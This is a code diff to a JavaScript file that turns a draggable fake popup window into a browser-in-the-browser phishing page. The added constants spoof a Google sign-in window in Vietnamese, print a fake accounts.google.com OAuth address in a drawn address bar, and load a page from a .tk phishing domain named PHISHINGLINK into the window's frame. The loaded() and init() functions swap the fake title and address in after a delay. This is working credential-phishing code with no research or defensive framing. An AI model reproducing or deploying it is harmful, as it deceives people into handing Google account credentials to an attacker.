@@ -1,3 +1,12 @@
+const loadTITLE = "Đăng nhập";
+const TITLE = "Đăng nhập - Tài khoản Google - Google Chrome";
+const loadDOMAINNAME = "";
+const DOMAINNAME = "https://accounts.google.com/";
+const loadDOMAINPATH = "about:blank";
+const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow";
+const PHISHINGLINK = "https://www.ltp110.tk/google-login/";
+const loadTIME = 1000;
+
 var titleBar = document.getElementById("title-bar");
 var exit = document.getElementById("exit");
 var max = document.getElementById("maximize");
@@ -34,13 +43,16 @@ title.on('mousedown', function(e){
 });
 //////////////// Make window draggable end ////////////////
 
+init();
+document.querySelector("#content").src = PHISHINGLINK;
 
 ////////////////// Onclick listeners //////////////////
 // X button functionality
-$("#exit").click(function(){
-    $("#window").css("display", "none");
-    $("#content").css("visibility","hidden");
-  });
+$("#exit").click(function () {
+  $("#window").css("display", "none");
+  init();
+  $("#content").css("visibility", "hidden");
+});
 
 // Maximize button functionality
 $("#maximize").click(enlarge);
@@ -60,11 +72,20 @@ function enlarge(){
   }
 }
 
-$("#clickme").click(function(){
-  $("#window").css("display","block");
-  setTimeout(loaded, 1000);
+$("#clickme").click(function () {
+  $("#window").css("display", "block");
+  setTimeout(loaded, loadTIME);
 });
 
-function loaded(){
-  $("#content").css("visibility","visible");
+function loaded() {
+  document.querySelector("#logo-description").textContent = TITLE;
+  document.querySelector("#domain-name").textContent = DOMAINNAME;
+  document.querySelector("#domain-path").textContent = DOMAINPATH;
+  $("#content").css("visibility", "visible");
+}
+
+function init(){
+  document.querySelector("#logo-description").textContent = loadTITLE;
+  document.querySelector("#domain-name").textContent = loadDOMAINNAME;
+  document.querySelector("#domain-path").textContent = loadDOMAINPATH;
 }
